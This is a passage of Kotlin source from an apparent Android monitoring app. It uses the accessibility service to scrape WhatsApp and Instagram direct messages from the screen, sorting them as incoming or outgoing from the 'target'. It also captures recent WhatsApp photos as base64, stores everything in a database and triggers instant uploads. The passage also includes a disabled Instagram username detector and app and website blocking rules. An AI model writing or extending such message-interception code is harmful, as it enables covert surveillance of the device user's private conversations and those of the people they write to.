                if (rect.top < 380 && rect.bottom > 20 && node.text != null && node.text.isNotBlank()) {
                    headerNodes.add(node)
                }
                for (i in 0 until node.childCount) {
                    findHeader(node.getChild(i))
                }
            }
            findHeader(root)
            val candidate = headerNodes.firstOrNull {
                val s = it.text.toString().trim()
                !reservedTitles.any { res -> res.equals(s, ignoreCase = true) } &&
                !s.startsWith("last seen", ignoreCase = true) &&
                !s.startsWith("online", ignoreCase = true) &&
                !s.startsWith("typing", ignoreCase = true) &&
                !s.contains("end-to-end", ignoreCase = true) &&
                !isWhatsAppUiMetadataOrTimestamp(s) &&
                s.length in 2..60
            }?.text?.toString()?.trim()

            if (!candidate.isNullOrBlank()) return candidate
        } catch (_: Exception) {}

        return lastClickedWhatsAppChat
    }

    fun hasDirectChatComposer(node: AccessibilityNodeInfo?, depth: Int = 0): Boolean {
        if (node == null || depth > 4) return false
        val id = (node.viewIdResourceName ?: "").lowercase()
        val text = (node.text?.toString() ?: "").trim()
        val hint = (node.hintText?.toString() ?: "").trim()
        val desc = (node.contentDescription?.toString() ?: "").trim()

        if (id.contains("composer_edittext") || id.contains("row_thread_composer")) return true
        if (id.contains("composer_button_send")) return true
        if (hint.contains("Message", ignoreCase = true) || text.contains("Message", ignoreCase = true)) return true
        if (hint.contains("Send message", ignoreCase = true) || text.contains("Send message", ignoreCase = true)) return true
        if (desc.contains("Send", ignoreCase = true) && desc.contains("message", ignoreCase = true)) return true
        if (node.isEditable && (node.className?.toString()?.contains("EditText", ignoreCase = true) == true)) {
            if (!id.contains("search") && !desc.contains("search", ignoreCase = true) && !hint.contains("comment", ignoreCase = true)) {
                return true
            }
        }
        for (i in 0 until node.childCount) {
            if (hasDirectChatComposer(node.getChild(i), depth + 1)) return true
        }
        return false
    }

    private fun getInstagramCurrentChatTitle(root: AccessibilityNodeInfo?): String? {
        if (root == null) return lastClickedInstagramChat
        val reservedTitles = setOf(
            "Instagram", "Direct", "Messages", "Reels", "Explore", "Search",
            "Notifications", "Post", "Posts", "Audio", "Tagged", "Comments", "Likes", "Activity",
            "Back", "Navigate up", "More options", "Audio call", "Video call", "Details"
        )
        try {
            val candidateIds = listOf(
                "com.instagram.android:id/action_bar_title",
                "com.instagram.android:id/action_bar_large_title_auto_size",
                "com.instagram.android:id/row_thread_header_name",
                "com.instagram.android:id/thread_title"
            )
            for (id in candidateIds) {
                val node = root.findAccessibilityNodeInfosByViewId(id).firstOrNull()
                val text = (node?.text ?: node?.contentDescription)?.toString()?.trim()
                if (!text.isNullOrBlank() && !reservedTitles.contains(text) && !WhatsAppNotificationListener.isInstagramUiMetadataOrTimestamp(text)) {
                    return text
                }
            }

            val headerNodes = mutableListOf<String>()
            fun findHeader(node: AccessibilityNodeInfo?, depth: Int = 0) {
                if (node == null || depth > 8) return
                val rect = Rect()
                node.getBoundsInScreen(rect)
                if (rect.top < 450 && rect.bottom > 20) {
                    val t = node.text?.toString()?.trim()
                    val cd = node.contentDescription?.toString()?.trim()
                    if (!t.isNullOrBlank()) headerNodes.add(t)
                    if (!cd.isNullOrBlank() && cd != t) headerNodes.add(cd)
                }
                for (i in 0 until node.childCount) {
                    findHeader(node.getChild(i), depth + 1)
                }
            }
            findHeader(root)
            val candidate = headerNodes.firstOrNull { s ->
                !reservedTitles.any { res -> res.equals(s, ignoreCase = true) } &&
                !s.contains("Active", ignoreCase = true) &&
                !s.startsWith("Switched to", ignoreCase = true) &&
                !s.startsWith("Switch to", ignoreCase = true) &&
                !s.startsWith("Logged in", ignoreCase = true) &&
                !WhatsAppNotificationListener.isInstagramUiMetadataOrTimestamp(s) &&
                s.length in 2..50
            }
            if (!candidate.isNullOrBlank()) return candidate
        } catch (_: Exception) {}

        return lastClickedInstagramChat
    }

    fun recordWhatsAppChatIfForeground(root: AccessibilityNodeInfo?) {
        if (root == null) return
        val pkg = root.packageName?.toString() ?: ""
        if (pkg != "com.whatsapp" && pkg != "com.whatsapp.w4b") return

        // 1. Strict verification: ONLY record messages if user is inside an actual active WhatsApp conversation with composer!
        // Fast O(1) check: WhatsApp conversation always contains the input entry node.
        val entryNodes = try {
            root.findAccessibilityNodeInfosByViewId("com.whatsapp:id/entry")
        } catch (_: Exception) { null }

        if (entryNodes.isNullOrEmpty() && !hasWhatsAppChatComposer(root, 0)) return

        try {
            val entriesToInsert = mutableListOf<WhatsAppMessageEntry>()
            val now = System.currentTimeMillis()
            val displayMetrics = resources.displayMetrics
            val screenWidth = displayMetrics.widthPixels
            val screenHeight = displayMetrics.heightPixels

            fun extractReelUrl(txt: String?): String? = WhatsAppNotificationListener.extractReelUrl(txt)

            fun findReelUrlInNode(node: AccessibilityNodeInfo?, depth: Int = 0): String? {
                if (node == null || depth > 4) return null
                val t = node.text?.toString()
                val cd = node.contentDescription?.toString()
                extractReelUrl(t)?.let { return it }
                extractReelUrl(cd)?.let { return it }
                for (i in 0 until node.childCount) {
                    val found = findReelUrlInNode(node.getChild(i), depth + 1)
                    if (found != null) return found
                }
                return null
            }

            fun findReelUrlNearby(node: AccessibilityNodeInfo?): String? {
                if (node == null) return null
                findReelUrlInNode(node)?.let { return it }
                node.parent?.let { parent ->
                    findReelUrlInNode(parent)?.let { return it }
                    parent.parent?.let { grandParent ->
                        findReelUrlInNode(grandParent)?.let { return it }
                    }
                }
                return null
            }

            // Find WhatsApp contact/group name in top action bar
            val chatTitle = getWhatsAppCurrentChatTitle(root) ?: "WhatsApp Chat"

            val candidateNodes = mutableListOf<AccessibilityNodeInfo>()
            fun collectMessageNodes(node: AccessibilityNodeInfo?) {
                if (node == null) return
                if (node.isEditable || node.className?.toString()?.contains("EditText", ignoreCase = true) == true) return
                val t = node.text?.toString()?.trim()
                val cd = node.contentDescription?.toString()?.trim()
                val rect = Rect()
                node.getBoundsInScreen(rect)

                // Message bubbles appear between the top header (top > 140) and bottom message composer (bottom <= screenHeight - 120)
                if (rect.top > 140 && rect.bottom <= (screenHeight - 120)) {
                    val isTextTs = !t.isNullOrBlank() && isWhatsAppUiMetadataOrTimestamp(t)
                    val isCdTs = !cd.isNullOrBlank() && isWhatsAppUiMetadataOrTimestamp(cd)

                    if (!isTextTs && !isCdTs) {
                        val candidateText = when {
                            !t.isNullOrBlank() -> t
                            !cd.isNullOrBlank() -> cd
                            else -> null
                        }
                        if (!candidateText.isNullOrBlank() &&
                            !candidateText.equals(chatTitle, ignoreCase = true) &&
                            !candidateText.equals("Type a message", ignoreCase = true) &&
                            !candidateText.equals("Message", ignoreCase = true) &&
                            !candidateText.equals("Search", ignoreCase = true) &&
                            !candidateText.equals("WhatsApp", ignoreCase = true) &&
                            !candidateText.contains("end-to-end encrypted", ignoreCase = true)
                        ) {
                            candidateNodes.add(node)
                        }
                    }
                }
                for (i in 0 until node.childCount) {
                    collectMessageNodes(node.getChild(i))
                }
            }
            collectMessageNodes(root)

            for (node in candidateNodes) {
                val t = node.text?.toString()?.trim()
                val cd = node.contentDescription?.toString()?.trim()
                val rawText = when {
                    !t.isNullOrBlank() -> t
                    !cd.isNullOrBlank() -> cd
                    else -> continue
                }
                if (rawText.isBlank() || isWhatsAppUiMetadataOrTimestamp(rawText)) continue

                var extractedMsg = rawText
                if (node.text.isNullOrBlank() && !cd.isNullOrBlank()) {
                    val colonIdx = cd.indexOf(": ")
                    if (colonIdx != -1) {
                        val afterColon = cd.substring(colonIdx + 2).trim()
                        val receiptRegex = Regex(",\\s*(?:Delivered|Read|Sent|Pending)$", RegexOption.IGNORE_CASE)
                        extractedMsg = afterColon.replace(receiptRegex, "").trim()
                    }
                }
                if (extractedMsg.isBlank() || isWhatsAppUiMetadataOrTimestamp(extractedMsg)) continue

                val rect = Rect()
                node.getBoundsInScreen(rect)
                val parentRect = Rect()
                node.parent?.getBoundsInScreen(parentRect)

                val cleanText = if (extractedMsg.startsWith("You: ", ignoreCase = true)) extractedMsg.substring(5).trim() else extractedMsg
                if (cleanText.isBlank() || isWhatsAppUiMetadataOrTimestamp(cleanText)) continue

                // Check delivery status icons / receipts on container or ancestors (Delivered, Read, Sent, Pending, Checkmarks)
                var hasStatusIcon = false
                var container = node.parent
                var containerDepth = 0
                while (container != null && containerDepth < 3) {
                    for (i in 0 until container.childCount) {
                        val ch = container.getChild(i) ?: continue
                        val chId = (ch.viewIdResourceName ?: "").lowercase()
                        val chDesc = (ch.contentDescription ?: "").toString().lowercase()
                        if (chId.contains("status") || chId.contains("receipt") || chId.contains("msg_status") ||
                            chDesc.contains("delivered") || chDesc.contains("read") || chDesc.contains("sent") ||
                            chDesc.contains("pending") || chDesc.contains("clock") || chDesc.contains("check")) {
                            hasStatusIcon = true
                            break
                        }
                    }
                    if (hasStatusIcon) break
                    container = container.parent
                    containerDepth++
                }

                val normalizedText = cleanText.lowercase().trim()
                val lastSentTime = recentSentWhatsAppTexts[normalizedText]
                val isRecentlySentByTarget = lastSentTime != null && (now - lastSentTime) < 120_000L

                // Outgoing detection:
                // 1. Text was recently sent from composer on this device
                // 2. Bubble container has delivery receipt icon (Delivered, Read, Sent, Pending)
                // 3. Message text starts with "You: "
                // 4. Content description has receipt text
                // 5. Bubble or text node is anchored to the right side of the screen
                // 6. Node center is significantly right of screen center
                val isOutgoing = isRecentlySentByTarget ||
                                 hasStatusIcon ||
                                 extractedMsg.startsWith("You: ", ignoreCase = true) ||
                                 (cd != null && (cd.contains("Delivered", ignoreCase = true) || cd.contains("Read", ignoreCase = true) || cd.contains("Sent", ignoreCase = true))) ||
                                 (parentRect.right >= (screenWidth * 0.80f) && parentRect.left > (screenWidth * 0.14f)) ||
                                 (rect.right >= (screenWidth * 0.75f) && rect.left > (screenWidth * 0.14f)) ||
                                 rect.centerX() > (screenWidth * 0.52f)

                val reelUrl = findReelUrlNearby(node) ?: extractReelUrl(cleanText) ?: extractReelUrl(cd)
                val isReel = reelUrl != null ||
                    cleanText.contains("sent a reel", ignoreCase = true) ||
                    cleanText.contains("shared a reel", ignoreCase = true) ||
                    (cd != null && cd.contains("reel", ignoreCase = true))

                val isImage = !isReel && (
                    cleanText.contains("photo", ignoreCase = true) ||
                    cleanText.contains("📷") ||
                    (cd != null && (cd.contains("photo", ignoreCase = true) || cd.contains("image", ignoreCase = true))) ||
                    node.className?.toString()?.contains("ImageView", ignoreCase = true) == true
                )

                val isVideo = !isReel && !isImage && (
                    cleanText.contains("video", ignoreCase = true) ||
                    cleanText.contains("🎥") ||
                    (cd != null && cd.contains("video", ignoreCase = true))
                )

                val isAudio = !isReel && !isImage && !isVideo && (
                    cleanText.contains("voice message", ignoreCase = true) ||
                    cleanText.contains("audio", ignoreCase = true) ||
                    (cd != null && cd.contains("voice message", ignoreCase = true))
                )

                val itemMediaType = when {
                    isReel -> "reel"
                    isImage -> "image"
                    isVideo -> "video"
                    isAudio -> "audio"
                    else -> "text"
                }

                var mediaPath: String? = null
                if (isImage) {
                    try {
                        mediaPath = FileManagerCollector(applicationContext).getLatestWhatsAppImageBase64()
                    } catch (_: Exception) {}
                }

                val finalText = when {
                    isReel && (cleanText.isBlank() || cleanText.equals("reel", ignoreCase = true)) -> reelUrl ?: "Instagram Reel"
                    isImage && (cleanText.isBlank() || cleanText.equals("photo", ignoreCase = true)) -> "Photo"
                    isVideo && cleanText.isBlank() -> "Video"
                    isAudio && cleanText.isBlank() -> "Voice message"
                    else -> cleanText
                }

                val key = "wa|$chatTitle|$finalText|$isOutgoing|$itemMediaType"
                if (capturedWhatsAppMsgHashes.add(key)) {
                    entriesToInsert.add(
                        WhatsAppMessageEntry(
                            chatName = chatTitle,
                            sender = if (isOutgoing) "me" else chatTitle,
                            messageText = finalText,
                            isOutgoing = isOutgoing,
                            messageTimeEpochMs = now,
                            mediaType = itemMediaType,
                            mediaPath = mediaPath,
                            reelUrl = reelUrl
                        )
                    )
                }
            }

            if (entriesToInsert.isNotEmpty()) {
                scope.launch {
                    try {
                        val db = AppDatabase.getInstance(applicationContext)
                        val filteredEntries = mutableListOf<WhatsAppMessageEntry>()
                        for (entry in entriesToInsert) {
                            val existingDirection = db.whatsAppMessageDao().findRecentMessageDirection(
                                entry.chatName,
                                entry.messageText,
                                entry.messageTimeEpochMs - 600_000L
                            )
                            if (existingDirection == null) {
                                filteredEntries.add(entry)
                            } else if (existingDirection == false && entry.isOutgoing) {
                                db.whatsAppMessageDao().updateToOutgoing(
                                    entry.chatName,
                                    entry.messageText,
                                    entry.messageTimeEpochMs - 600_000L
                                )
                                com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantWhatsAppUpload(applicationContext)
                            }
                        }
                        if (filteredEntries.isNotEmpty()) {
                            db.whatsAppMessageDao().insertAll(filteredEntries)
                            com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantWhatsAppUpload(applicationContext)
                        }
                    } catch (e: Exception) {
                        Log.e("BlockA11y", "Failed to insert captured WhatsApp messages", e)
                    }
                }
            }
        } catch (_: Exception) {
        }
    }

    private var instagramPollRunnable: Runnable? = null
    private fun startInstagramPolling() {
        if (instagramPollRunnable != null) return
        val runnable = object : Runnable {
            override fun run() {
                recordInstagramChatIfForeground(rootInActiveWindow)
                pollHandler.postDelayed(this, 2000L)
            }
        }
        instagramPollRunnable = runnable
        pollHandler.postDelayed(runnable, 500L)
    }

    private fun stopInstagramPolling() {
        instagramPollRunnable?.let { pollHandler.removeCallbacks(it) }
        instagramPollRunnable = null
    }

    /**
     * Checks if a tapped node in com.instagram.android belongs to the in-app Account Switcher sheet.
     * Fires immediately when the user taps an account row to switch — ZERO reliance on toast messages!
     */
    private fun checkAccountSwitcherClick(clicked: AccessibilityNodeInfo?, root: AccessibilityNodeInfo?) {
        if (clicked == null) return
        try {
            val texts = mutableListOf<String>()
            fun collect(n: AccessibilityNodeInfo?) {
                if (n == null) return
                n.text?.toString()?.trim()?.let { if (it.isNotBlank()) texts.add(it) }
                n.contentDescription?.toString()?.trim()?.let { if (it.isNotBlank()) texts.add(it) }
                n.hintText?.toString()?.trim()?.let { if (it.isNotBlank()) texts.add(it) }
                for (i in 0 until n.childCount) {
                    collect(n.getChild(i))
                }
            }
            collect(clicked)
            clicked.parent?.let { parent ->
                for (i in 0 until parent.childCount) {
                    val child = parent.getChild(i)
                    child?.text?.toString()?.trim()?.let { if (it.isNotBlank()) texts.add(it) }
                    child?.contentDescription?.toString()?.trim()?.let { if (it.isNotBlank()) texts.add(it) }
                }
            }

            val reserved = setOf(
                "instagram", "switch accounts", "add account", "log in", "accounts", "cancel", "done",
                "close", "choose an account", "log out", "settings", "edit profile", "share profile"
            )
            for (t in texts) {
                val clean = t.removePrefix("@").trim().lowercase()
                if (clean.length in 3..32 &&
                    clean.matches("^[a-zA-Z0-9._]+$".toRegex()) &&
                    !clean.matches("^[0-9]+$".toRegex()) &&
                    !reserved.contains(clean)
                ) {
                    Log.i("BlockA11y", ">>> Account Switcher tapped row detected: '$clean'")
                    notifyInstagramAccountDetected(clean)
                    break
                }
            }
        } catch (_: Exception) {}
    }

    /**
     * Public handler called whenever an active Instagram account username is detected from ANY source
     * (Home feed comment box, account switcher click, bottom navigation tab, or notification subtext).
     * Compares against current account and notifies backend immediately.
     */
    fun notifyInstagramAccountDetected(detectedUsername: String) {
        // Disabled per user requirement: do not find or track login ID
    }

    fun detectAndHandleInstagramAccountSwitch(root: AccessibilityNodeInfo?) {
        if (root == null) return
        return
        val pkg = root.packageName?.toString() ?: ""
        if (pkg != "com.instagram.android") return

        try {
            val allTexts = mutableListOf<String>()
            val topCandidates = mutableListOf<Pair<String, Rect>>()
            val viewIdCandidates = mutableListOf<String>()

            fun traverseNodes(node: AccessibilityNodeInfo?) {
                if (node == null) return

                val t = node.text?.toString()?.trim()
                if (!t.isNullOrBlank()) {
                    allTexts.add(t)
                    val r = Rect()
                    node.getBoundsInScreen(r)
                    if (r.top < 500 && r.height() in 15..250) {
                        topCandidates.add(Pair(t, r))
                    }
                }

                val cd = node.contentDescription?.toString()?.trim()
                if (!cd.isNullOrBlank()) {
                    allTexts.add(cd)
                    val r = Rect()
                    node.getBoundsInScreen(r)
                    if (r.top < 500 && r.height() in 15..250) {
                        topCandidates.add(Pair(cd, r))
                    }
                }

                // Crucial for Instagram feed posts & reels: hintText = "Add a comment as <username>..."
                val hint = node.hintText?.toString()?.trim()
                if (!hint.isNullOrBlank()) {
                    allTexts.add(hint)
                }

                val vId = node.viewIdResourceName
                if (!vId.isNullOrBlank()) {
                    if (vId.endsWith(":id/row_user_primary_name") ||
                        vId.endsWith(":id/action_bar_title") ||
                        vId.endsWith(":id/action_bar_large_title") ||
                        vId.endsWith(":id/action_bar_textview_title") ||
                        vId.endsWith(":id/username") ||
                        vId.endsWith(":id/profile_tab")
                    ) {
                        val txt = node.text?.toString()?.trim() ?: node.contentDescription?.toString()?.trim()
                        if (!txt.isNullOrBlank()) {
                            viewIdCandidates.add(txt)
                        }
                    }
                }

                for (i in 0 until node.childCount) {
                    traverseNodes(node.getChild(i))
                }
            }
            traverseNodes(root)

            var detectedUsername: String? = null

            val reserved = setOf(
                "instagram", "direct", "messages", "search", "explore", "reels", "threads",
                "meta", "camera", "chats", "calls", "following", "followers", "edit profile",
                "share profile", "notifications", "settings", "activity", "close friends",
                "posts", "saved", "archive", "qr code", "audio", "video", "primary", "general",
                "requests", "notes", "new message", "create", "options", "more options", "back",
                "professional dashboard", "tools", "insights", "ad tools", "switch accounts",
                "add account", "log in", "log out", "accounts", "profile", "home", "search & explore",
                "uninstall", "security", "music", "danger", "tab", "double tap", "like", "reply",
                "send", "view", "comment"
            )

            // STRATEGY 1: Feed / Post / Reels Comment Box Placeholder (e.g. "Add a comment as <username>...", "Comment as <username>...")
            // On Instagram Home Feed, every post has a comment box with this exact placeholder!
            // Directly works on the Home Feed without user clicking Profile or Message icon!
            for (text in allTexts) {
                val match = "(?i)(?:add\\s+a\\s+comment\\s+as|comment\\s+as|replying\\s+as|posting\\s+as|sharing\\s+as|logged\\s+in\\s+as|signed\\s+in\\s+as|continue\\s+as)\\s+@?([a-zA-Z0-9._]+)".toRegex().find(text)
                if (match != null) {
                    val candidate = match.groupValues[1].trim().trimEnd('.').removePrefix("@").lowercase()
                    if (candidate.length in 3..32 && !reserved.contains(candidate) && candidate.matches("^[a-zA-Z0-9._]+$".toRegex())) {
                        detectedUsername = candidate
                        break
                    }
                }
            }

            // STRATEGY 2: In-App Account Switcher Dialog / Bottom Sheet
            // When user switches accounts via long-press profile or chevron, the switcher sheet lists accounts directly.
            val isSwitcherSheet = allTexts.any {
                it.contains("Switch accounts", ignoreCase = true) ||
                it.contains("Choose an account", ignoreCase = true) ||
                it.contains("Add account", ignoreCase = true) ||
                it.contains("Log into existing account", ignoreCase = true)
            }
            if (detectedUsername == null && isSwitcherSheet) {
                for (cand in viewIdCandidates + allTexts) {
                    val clean = cand.removePrefix("@").trim().lowercase()
                    if (clean.length in 3..32 &&
                        clean.matches("^[a-zA-Z0-9._]+$".toRegex()) &&
                        !clean.matches("^[0-9]+$".toRegex()) &&
                        !reserved.contains(clean)
                    ) {
                        detectedUsername = clean
                        break
                    }
                }
            }

            // STRATEGY 3: Bottom Navigation Bar Profile Tab ContentDescription
            // e.g. "Profile for <user>", "<user>'s profile"
            if (detectedUsername == null) {
                for (text in allTexts) {
                    val match1 = "(?i)(?:profile\\s+(?:for|of|tab)?\\s*[:,-]?\\s*@?([a-zA-Z0-9._]+))".toRegex().find(text)
                    if (match1 != null) {
                        val candidate = match1.groupValues[1].trim().trimEnd('.').removePrefix("@").lowercase()
                        if (candidate.length in 3..32 && !reserved.contains(candidate) && !candidate.startsWith("tab") && !candidate.matches("^[0-9]+$".toRegex())) {
                            detectedUsername = candidate
                            break
                        }
                    }
                    val match2 = "(?i)@?([a-zA-Z0-9._]+)(?:'s)?\\s+profile(?:,\\s*tab)?".toRegex().find(text)
                    if (match2 != null) {
                        val candidate = match2.groupValues[1].trim().trimEnd('.').removePrefix("@").lowercase()
                        if (candidate.length in 3..32 && !reserved.contains(candidate) && !candidate.startsWith("tab") && !candidate.matches("^[0-9]+$".toRegex())) {
                            detectedUsername = candidate
                            break
                        }
                    }
                }
            }

            // STRATEGY 4: Action Bar Title / View IDs (e.g. action_bar_title)
            if (detectedUsername == null && viewIdCandidates.isNotEmpty()) {
                for (cand in viewIdCandidates) {
                    val clean = cand.removePrefix("@").trim().lowercase()
                    if (clean.length in 3..32 &&
                        clean.matches("^[a-zA-Z0-9._]+$".toRegex()) &&
                        !clean.matches("^[0-9]+$".toRegex()) &&
                        !reserved.contains(clean)
                    ) {
                        detectedUsername = clean
                        break
                    }
                }
            }

            // STRATEGY 5: Own Profile Screen Detection (when visited)
            val isOwnProfile = allTexts.any {
                it.contains("Edit profile", ignoreCase = true) ||
                it.contains("Share profile", ignoreCase = true) ||
                it.contains("Professional dashboard", ignoreCase = true) ||
                (allTexts.any { t -> t.contains("Followers", ignoreCase = true) } &&
                 allTexts.any { t -> t.contains("Following", ignoreCase = true) })
            }

            if (detectedUsername == null && isOwnProfile) {
                for ((text, rect) in topCandidates) {
                    val candidate = text.removePrefix("@").trim().lowercase()
                    if (rect.top < 450 &&
                        candidate.length in 3..32 &&
                        candidate.matches("^[a-zA-Z0-9._]+$".toRegex()) &&
                        !candidate.matches("^[0-9]+$".toRegex()) &&
                        !reserved.contains(candidate)
                    ) {
                        detectedUsername = candidate
                        break
                    }
                }
            }

            // STRATEGY 6: Direct Messages Inbox Screen Detection (when visited)
            val isDirectInbox = (allTexts.any { it.equals("Direct", ignoreCase = true) || it.equals("Messages", ignoreCase = true) } &&
                allTexts.any { it.contains("Search", ignoreCase = true) || it.contains("Notes", ignoreCase = true) || it.contains("Requests", ignoreCase = true) })

            if (detectedUsername == null && isDirectInbox) {
                for ((text, rect) in topCandidates) {
                    val candidate = text.removePrefix("@").trim().lowercase()
                    if (rect.top < 350 && rect.left < 500 &&
                        candidate.length in 3..32 &&
                        candidate.matches("^[a-zA-Z0-9._]+$".toRegex()) &&
                        !candidate.matches("^[0-9]+$".toRegex()) &&
                        !reserved.contains(candidate)
                    ) {
                        detectedUsername = candidate
                        break
                    }
                }
            }

            if (!detectedUsername.isNullOrBlank()) {
                notifyInstagramAccountDetected(detectedUsername)
            }
        } catch (_: Exception) {}
    }

    fun recordInstagramChatIfForeground(root: AccessibilityNodeInfo?) {
        if (root == null) return
        val pkg = root.packageName?.toString() ?: ""
        if (pkg != "com.instagram.android") return

        // Ultra-fast O(1) check: Instagram Direct conversation always has row_thread_composer_edittext.
        // Reels, Explore, Feed, and Profile views return empty in <0.1ms and immediately exit,
        // eliminating any frame drop or Main Looper freeze while scrolling reels!
        val composerNodes = try {
            root.findAccessibilityNodeInfosByViewId("com.instagram.android:id/row_thread_composer_edittext")
        } catch (_: Exception) { null }

        if (composerNodes.isNullOrEmpty() && !hasDirectChatComposer(root, 0)) {
            return
        }

        detectAndHandleInstagramAccountSwitch(root)

        try {
            val entriesToInsert = mutableListOf<InstagramMessageEntry>()
            val now = System.currentTimeMillis()
            val displayMetrics = resources.displayMetrics

            fun extractReelUrl(txt: String?): String? = WhatsAppNotificationListener.extractReelUrl(txt)

            fun findReelUrlInNode(node: AccessibilityNodeInfo?, depth: Int = 0): String? {
                if (node == null || depth > 4) return null
                val t = node.text?.toString()
                val cd = node.contentDescription?.toString()
                extractReelUrl(t)?.let { return it }
                extractReelUrl(cd)?.let { return it }
                for (i in 0 until node.childCount) {
                    val found = findReelUrlInNode(node.getChild(i), depth + 1)
                    if (found != null) return found
                }
                return null
            }

            fun findReelUrlNearby(node: AccessibilityNodeInfo?): String? {
                if (node == null) return null
                findReelUrlInNode(node)?.let { return it }
                node.parent?.let { parent ->
                    findReelUrlInNode(parent)?.let { return it }
                    parent.parent?.let { grandParent ->
                        findReelUrlInNode(grandParent)?.let { return it }
                    }
                }
                return null
            }

            // Find Direct Chat username in top action bar
            val chatTitle = getInstagramCurrentChatTitle(root)

            if (!chatTitle.isNullOrBlank()) {
                val candidateNodes = mutableListOf<AccessibilityNodeInfo>()
                fun collectMessageNodes(node: AccessibilityNodeInfo?) {
                    if (node == null) return
                    if (node.isEditable || node.className?.toString()?.contains("EditText", ignoreCase = true) == true) return
                    val t = node.text?.toString()?.trim()
                    val cd = node.contentDescription?.toString()?.trim()
                    val rect = Rect()
                    node.getBoundsInScreen(rect)

                    // Message bubbles appear between the top header (top > 140) and bottom message composer (bottom <= height - 120)
                    if (rect.top > 140 && rect.bottom <= (displayMetrics.heightPixels - 120)) {
                        val isTextTs = !t.isNullOrBlank() && WhatsAppNotificationListener.isInstagramUiMetadataOrTimestamp(t)
                        val isCdTs = !cd.isNullOrBlank() && WhatsAppNotificationListener.isInstagramUiMetadataOrTimestamp(cd)

                        if (!isTextTs && !isCdTs) {
                            val candidateText = when {
                                !t.isNullOrBlank() -> t
                                !cd.isNullOrBlank() && (cd.contains("reel", ignoreCase = true) || cd.contains("photo", ignoreCase = true) || cd.contains("image", ignoreCase = true) || cd.contains("video", ignoreCase = true)) -> cd
                                else -> null
                            }
                            if (!candidateText.isNullOrBlank() &&
                                !candidateText.equals(chatTitle, ignoreCase = true) &&
                                !candidateText.equals("Message...", ignoreCase = true) &&
                                !candidateText.equals("Search", ignoreCase = true) &&
                                !candidateText.equals("Instagram", ignoreCase = true)
                            ) {
                                candidateNodes.add(node)
                            }
                        }
                    }
                    for (i in 0 until node.childCount) {
                        collectMessageNodes(node.getChild(i))
                    }
                }
                collectMessageNodes(root)

                for (node in candidateNodes) {
                    val t = node.text?.toString()?.trim()
                    val cd = node.contentDescription?.toString()?.trim()
                    val rawText = when {
                        !t.isNullOrBlank() -> t
                        !cd.isNullOrBlank() -> cd
                        else -> continue
                    }
                    if (rawText.isBlank()) continue
                    if (WhatsAppNotificationListener.isInstagramUiMetadataOrTimestamp(rawText)) continue

                    val rect = Rect()
                    node.getBoundsInScreen(rect)
                    val isOutgoing = rect.left > (displayMetrics.widthPixels * 0.35f) ||
                                     rawText.startsWith("You sent ", ignoreCase = true) ||
                                     rawText.startsWith("You: ", ignoreCase = true)

                    val cleanText = when {
                        rawText.startsWith("You sent ", ignoreCase = true) -> rawText.substring(9).trim()
                        rawText.startsWith("You: ", ignoreCase = true) -> rawText.substring(5).trim()
                        else -> rawText
                    }
                    if (WhatsAppNotificationListener.isInstagramUiMetadataOrTimestamp(cleanText)) continue

                    val reelUrl = findReelUrlNearby(node) ?: extractReelUrl(cleanText) ?: extractReelUrl(cd)
                    val isReel = reelUrl != null ||
                        cleanText.contains("reel", ignoreCase = true) ||
                        (cd != null && cd.contains("reel", ignoreCase = true)) ||
                        cleanText.contains("shared a reel", ignoreCase = true) ||
                        cleanText.contains("sent a reel", ignoreCase = true)

                    val isImage = !isReel && (
                        cleanText.contains("photo", ignoreCase = true) ||
                        cleanText.contains("image", ignoreCase = true) ||
                        (cd != null && (cd.contains("photo", ignoreCase = true) || cd.contains("image", ignoreCase = true))) ||
                        cleanText.contains("sent a photo", ignoreCase = true) ||
                        cleanText.contains("shared a photo", ignoreCase = true) ||
                        node.className?.toString()?.contains("ImageView", ignoreCase = true) == true
                    )

                    val isVideo = !isReel && !isImage && (
                        cleanText.contains("video", ignoreCase = true) ||
                        (cd != null && cd.contains("video", ignoreCase = true)) ||
                        cleanText.contains("sent a video", ignoreCase = true)
                    )

                    val itemMediaType = when {
                        isReel -> "reel"
                        isImage -> "image"
                        isVideo -> "video"
                        else -> "text"
                    }

                    val finalText = when {
                        isReel && (cleanText.isBlank() || cleanText.equals("reel", ignoreCase = true)) -> reelUrl ?: "Shared a Reel"
                        isImage && (cleanText.isBlank() || cleanText.equals("photo", ignoreCase = true) || cleanText.equals("sent a photo", ignoreCase = true)) -> "Photo"
                        isVideo && cleanText.isBlank() -> "Video"
                        else -> cleanText
                    }

                    val key = "ig|$chatTitle|$finalText|$isOutgoing|$itemMediaType"
                    if (capturedWhatsAppMsgHashes.add(key)) {
                        entriesToInsert.add(
                            InstagramMessageEntry(
                                chatName = chatTitle,
                                sender = if (isOutgoing) "me" else chatTitle,
                                messageText = finalText,
                                isOutgoing = isOutgoing,
                                messageTimeEpochMs = now,
                                mediaType = itemMediaType,
                                reelUrl = reelUrl,
                                targetAccount = null
                            )
                        )
                    }
                }
            }

            if (entriesToInsert.isNotEmpty()) {
                scope.launch {
                    try {
                        val db = AppDatabase.getInstance(applicationContext)
                        db.instagramMessageDao().insertAll(entriesToInsert)
                        com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantInstagramUpload(applicationContext)
                    } catch (e: Exception) {
                        Log.e("BlockA11y", "Failed to insert captured Instagram messages", e)
                    }
                }
            }
        } catch (_: Exception) {}
    }

    /**
     * Re-checks the URL bar every ~1.5s while a browser stays foreground —
     * this is what catches navigating to a different site within the same
     * browser window, which never fires its own TYPE_WINDOW_STATE_CHANGED.
     * Cancelled the moment any other app's window comes to the foreground
     * (stopBrowserPolling, above), so it never runs while the user isn't
     * actually in a browser.
     */
    private fun startBrowserPolling() {
        if (browserPollRunnable != null) return // already running
        val runnable = object : Runnable {
            override fun run() {
                checkWebsiteRules()
                pollHandler.postDelayed(this, browserPollIntervalMs)
            }
        }
        browserPollRunnable = runnable
        pollHandler.postDelayed(runnable, browserPollIntervalMs)
    }

    private fun stopBrowserPolling() {
        browserPollRunnable?.let { pollHandler.removeCallbacks(it) }
        browserPollRunnable = null
    }

    private fun loadedRules(): List<BlockRule> {
        if (!::rulesCache.isInitialized) rulesCache = BlockRulesCache(applicationContext)
        return rulesCache.load()
    }

    private fun checkAppRule(packageName: String) {
        val rules = loadedRules()
        if (rules.isEmpty()) return
        val (dayAbbrev, minutesOfDay) = currentDayAndMinute()

        rules.firstOrNull { it.ruleType == "app" && it.target == packageName }
            ?.let { rule ->
